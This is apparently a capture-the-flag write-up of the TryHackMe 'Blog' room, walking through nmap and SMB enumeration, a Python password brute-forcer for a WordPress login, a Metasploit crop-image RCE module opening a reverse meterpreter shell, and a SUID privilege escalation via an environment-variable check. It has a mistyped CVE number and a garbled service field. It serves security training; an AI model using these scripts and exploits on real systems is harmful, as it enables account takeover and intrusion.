# THM-Blog
An intermediate level Wordpress based CTF. Decided to document it because I was forced to use some creative methods in order to crack the machine.

## Phase 1: Initial Foothold
As per usual, we begin our pentesting efforts by trying to look for a way to access the machine. We scan for open ports utilizing nmap.
For our initial -sS scan, we get the following results:

```
sudo nmap -p- -Pn -n --min-rate 5000 $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-05 22:09 UTC
Warning: 10.10.21.52 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.21.52
Host is up (0.14s latency).
Not shown: 64924 closed tcp ports (reset), 607 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 55.36 seconds
```
We have ssh, http and smb open. We then proceed to make a version scan for the services we found.

```
sudo nmap -sCV -p 22,80,139,445 -Pn -n -oN targeted $IP
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-05 22:13 UTC
Nmap scan report for 10.10.21.52
Host is up (0.16s latency).

PORT    STATE SERVICE                                              VERSION
22/tcp  open  ssh                                                  OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http                                                 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 5.0
139/tcp open  netbios-ssn                                          Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  6BdYGPjEEdZGPKXv5uHnseNe1SzvLZBoYz7KNpPVQ8uShudDnOI= Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-01-05T22:13:22
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2024-01-05T22:13:22+00:00
|_clock-skew: mean: -6s, deviation: 0s, median: -6s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.29 seconds
```
SMB has guest level authentication for access? Don't mind if I do!
```
nxc smb $IP -u 'Guest' -p '' --shares
Recreating virtualenv netexec-PWU1S8Zj-py3.11 in /usr/share/netexec/virtualenvs/netexec-PWU1S8Zj-py3.11

[Errno 13] Permission denied: 'version.py'
SMB         10.10.21.52     445    BLOG             [*] Windows 6.1 (name:BLOG) (domain:) (signing:False) (SMBv1:True)
SMB         10.10.21.52     445    BLOG             [+] \Guest: 
SMB         10.10.21.52     445    BLOG             [*] Enumerated shares
SMB         10.10.21.52     445    BLOG             Share           Permissions     Remark
SMB         10.10.21.52     445    BLOG             -----           -----------     ------
SMB         10.10.21.52     445    BLOG             print$                          Printer Drivers
SMB         10.10.21.52     445    BLOG             BillySMB        READ,WRITE      Billy's local SMB Share
SMB         10.10.21.52     445    BLOG             IPC$                            IPC Service (blog server (Samba, Ubuntu))
```
By scanning what shares they have available through SMB, we find we actually have RW permissions on a share. This might be a potential access vector, so let's keep this in mind.

Let's spider the Billy share to see if there's anything interesting.

```
nxc smb $IP -u 'Guest' -p '' --spider "BillySMB" --regex .
Recreating virtualenv netexec-PWU1S8Zj-py3.11 in /usr/share/netexec/virtualenvs/netexec-PWU1S8Zj-py3.11

[Errno 13] Permission denied: 'version.py'
SMB         10.10.21.52     445    BLOG             [*] Windows 6.1 (name:BLOG) (domain:) (signing:False) (SMBv1:True)
SMB         10.10.21.52     445    BLOG             [+] \Guest: 
SMB         10.10.21.52     445    BLOG             [*] Started spidering
SMB         10.10.21.52     445    BLOG             [*] Spidering .
SMB         10.10.21.52     445    BLOG             //10.10.21.52/BillySMB/. [dir]
SMB         10.10.21.52     445    BLOG             //10.10.21.52/BillySMB/.. [dir]
SMB         10.10.21.52     445    BLOG             //10.10.21.52/BillySMB/Alice-White-Rabbit.jpg [lastm:'2020-05-26 18:17' size:33378]
SMB         10.10.21.52     445    BLOG             //10.10.21.52/BillySMB/tswift.mp4 [lastm:'2020-05-26 18:13' size:1236733]
SMB         10.10.21.52     445    BLOG             //10.10.21.52/BillySMB/check-this.png [lastm:'2020-05-26 18:13' size:3082]
SMB         10.10.21.52     445    BLOG             [*] Done spidering (Completed in 0.4403247833251953)
```

We have a video, a couple images. For the sake of the pentest there's nothing useful, so we won't comment too much about this.

Next, we head to te webpage.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/1a84426b-5713-4c0f-960d-b707d09a5c8e)

Uhh. Ok, weird looking page. Before I get to subdomain scanning, I like clicking a couple links here and there.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/e674c4a2-dc16-4432-9f8b-e12e51809a8d)

We're being redirected to blog.thm, huh? Let's go ahead and add it to /etc/hosts. And now we're talking!

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/f49d509d-595a-4dda-9e6d-70121f71ae9d)

My initial idea was to immediately scan for usernames using [wpscan](https://github.com/wpscanteam/wpscan), however I found myself unable to use it.

```
wpscan
/opt/wpscan/vendor/bundle/ruby/3.0.0/gems/activesupport-6.1.7.6/lib/active_support/core_ext/object/json.rb:4:in `require': cannot load such file -- json (LoadError)
	from /opt/wpscan/vendor/bundle/ruby/3.0.0/gems/activesupport-6.1.7.6/lib/active_support/core_ext/object/json.rb:4:in `<top (required)>'
	from /opt/wpscan/vendor/bundle/ruby/3.0.0/gems/activesupport-6.1.7.6/lib/active_support/core_ext/object.rb:13:in `require'
	from /opt/wpscan/vendor/bundle/ruby/3.0.0/gems/activesupport-6.1.7.6/lib/active_support/core_ext/object.rb:13:in `<top (required)>'
	from /opt/wpscan/vendor/bundle/ruby/3.0.0/gems/activesupport-6.1.7.6/lib/active_support/core_ext.rb:4:in `require'
	from /opt/wpscan/vendor/bundle/ruby/3.0.0/gems/activesupport-6.1.7.6/lib/active_support/core_ext.rb:4:in `block in <top (required)>'
	from /opt/wpscan/vendor/bundle/ruby/3.0.0/gems/activesupport-6.1.7.6/lib/active_support/core_ext.rb:3:in `each'
	from /opt/wpscan/vendor/bundle/ruby/3.0.0/gems/activesupport-6.1.7.6/lib/active_support/core_ext.rb:3:in `<top (required)>'
	from /opt/wpscan/vendor/bundle/ruby/3.0.0/gems/activesupport-6.1.7.6/lib/active_support/all.rb:5:in `require'
	from /opt/wpscan/vendor/bundle/ruby/3.0.0/gems/activesupport-6.1.7.6/lib/active_support/all.rb:5:in `<top (required)>'
	from /opt/wpscan/lib/wpscan.rb:7:in `require'
	from /opt/wpscan/lib/wpscan.rb:7:in `<top (required)>'
	from /opt/wpscan/bin/wpscan:4:in `require'
	from /opt/wpscan/bin/wpscan:4:in `<main>'
```
Although I tried to troubleshoot, I got nowhere with this. But it's no big deal, our jobs as hackers is finding a way!

Of course, we begin a GoBuster scan and leave it in the background. In the mean time, we use a couple tricks I picked up from [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress) to manually enumerate information.

```
curl http://blog.thm/ | grep 'content="WordPress'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<meta name="generator" content="WordPress 5.0" />
100 32028    0 32028    0     0  38852      0 --:--:-- --:--:-- --:--:-- 38868
```
We curl the page and find the version inside the source code. Let's see if we can find some vulnerabilties related to this. We find this [exploit](https://www.exploit-db.com/exploits/49512), which is tied to CVE-2019-89242. Regarding this CVE, I found this amazing [article](https://www.trendmicro.com/en_us/research/19/b/analyzing-wordpress-remote-code-execution-vulnerabilities-cve-2019-8942-and-cve-2019-8943.html) which goes over how this CVE works. For the sake of this pentest, there is a metasploit module that automizes the exploit process, so we will be using that. However, this exploit is an authenticated exploit, lets focus our attention on that end.

First, we need users. By observing the page, we find users 'bjoel' and 'kwheel' in the posts 'Welcome!' and 'A Note From Mom', which is immediately visible as soon as you enter the page.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/d5b1927f-7159-4c38-8b0b-0b7c6f2641d2)

Lets quickly check back on our GoBuster scan.

```
gobuster dir -u http://$IP -w /usr/share/SecLists-master/Discovery/Web-Content/raft-small-directories.txt -x html,txt,js,css,php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.21.52
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists-master/Discovery/Web-Content/raft-small-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              css,php,html,txt,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
/wp-content           (Status: 301) [Size: 315] [--> http://10.10.86.84/wp-content/]
/wp-admin             (Status: 301) [Size: 313] [--> http://10.10.86.84/wp-admin/]
/wp-includes          (Status: 301) [Size: 316] [--> http://10.10.86.84/wp-includes/]
/xmlrpc.php           (Status: 405) [Size: 42]
/login                (Status: 302) [Size: 0] [--> http://blog.thm/wp-login.php]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.86.84/feed/]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.86.84/feed/]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.86.84/]
/wp-feed.php          (Status: 301) [Size: 0] [--> http://blog.thm/feed/]
/dashboard            (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
/wp-login.php         (Status: 200) [Size: 3087]
/0                    (Status: 301) [Size: 0] [--> http://10.10.86.84/0/]
/embed                (Status: 301) [Size: 0] [--> http://10.10.86.84/embed/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.86.84/feed/atom/]
/robots.txt           (Status: 200) [Size: 67]
/license.txt          (Status: 200) [Size: 19935]
/}                    (Status: 301) [Size: 0] [--> http://10.10.86.84/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.86.84/feed/]
```
And let's quickly try to log in with admin credentials on the web page login screen.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/ae1f43b5-0d37-464f-ba8d-db00ab79c4ad)

We currently have two options. From the GoBuster scan, we have access to the xmlrpc, which can be used to brute force credentials. Alternatively, since the error message on the webpage confirms the existence of a user, we could also bruteforce using web requests. I decided to go for the second method. We use BurpSuite in order for us to see the how the request is sent out.

![image](https://github.com/Rapfael01/Write-ups/assets/70867743/f920991f-b4ef-4589-bbed-81ea34507d7d)

As we can see, the url we have to use is /wp-login.php and we can see all the parameters necessary for this process. After some research and trial and error, we developed the following Python bruteforce exploit.

```
import requests

users = []
passwords = []
pass_file = "/usr/share/Wordlists/rockyou.txt"
user_file = "/home/rat/Pentest/THM/Blog/exploits/users.txt"
url = "http://blog.thm/wp-login.php"
session=requests.Session()
rp=session.get(url)

if rp.status_code == 200:
    print("Cookies set successfully.")
else:
    print("Error setting cookies.")

with open(pass_file, 'r', encoding='latin-1') as pass_file:
    passwords = pass_file.read().splitlines()

with open(user_file, 'r', encoding='latin-1') as user_file:
    users = user_file.read().splitlines()

for p in passwords:
    for u in users:
        payload = {'log': u, 'pwd': p, 'wp-submit': 'Log+In', 'redirect_to': 'http://blog.thm/wp-admin/', 'testcookie': 1}
        response = session.post(url, data=payload)
        if response.status_code == 200:
            if "is incorrect." not in response.text:
                print(f"Valid credentials found: {u}:{p}")
        else:
            print("Request not sent")
```

We run it.

And after a long, long time, we get the result. I'll make it threaded next time lol.

```
python3 bruteforcer.py
Cookies set successfully.
Valid credentials found: kwheel:****
```

And with the login credentials available, we can use the metasploit module to gain access to the computer. We set the options as such.

```
msf6 exploit(multi/http/wp_crop_rce) > show options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   ********         yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:
                                         port][...]
   RHOSTS     http://blog.thm  yes       The target host(s), see https://docs.metasploit.co
                                         m/docs/using-metasploit/basics/using-metasploit.ht
                                         ml
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-d
                                         etection if provided)
   USERNAME   kwheel           yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.6.69.50       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress
```
We run.

```
msf6 exploit(multi/http/wp_crop_rce) > exploit

[*] Started reverse TCP handler on 10.6.69.50:4444 
[*] Authenticating with WordPress using kwheel:*****...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39927 bytes) to 10.10.21.52
[*] Meterpreter session 1 opened (10.6.69.50:4444 -> 10.10.21.52:41962) at 2024-01-05 23:22:43 +0000
[*] Attempting to clean up files...

meterpreter >
```
And voila! We're in!

## Phase 2: PrivEsc to root.

Priv esc in this machine was pretty straight forward.
We run the following command in order to list SUID/SGIDs in the system.

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwxr-sr-x 1 root shadow 71816 Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root tty 14328 Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root mlocate 43088 Mar  1  2018 /usr/bin/mlocate
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwxr-sr-x 1 root crontab 39352 Nov 16  2017 /usr/bin/crontab
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwxr-sr-x 1 root ssh 362640 Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 22808 Mar 22  2019 /usr/bin/expiry
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwxr-sr-x 1 root tty 30800 Mar  5  2020 /usr/bin/wall
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 root root 8432 May 26  2020 /usr/sbin/checker
```

On that last line, we can see a checker app, which is not a usual SUID app. Let's test it out see what it does.

```
checker
Not an Admin
```
Just not an admin? Lets analyze further.

```
strings /usr/sbin/checker
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
puts
getenv
system
__cxa_finalize
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
=9	
AWAVI
AUATL
[]A\A]A^A_
admin
/bin/bash
Not an Admin
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7698
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
checker.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
getenv@@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```
Analyzing the strings of the binary, we can see it has a setuid command. So maybe it sets a different uid if it determines we are an admin? We get no mention of the validation method though. Let's ltrace see if we can get any information.

```
ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
```

Getenv admin? Wait, don't tell me...

```
export admin=qwdqwdqwd
echo $admin
qwdqwdqwd
checker

id
uid=0(root) gid=33(www-data) groups=33(www-data)
export admin=
echo $admin 

checker
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```
So, basically, it checks if the admin environment variable exists, and if it does, it changes the uid to 0, making us root. And thus, we are root!
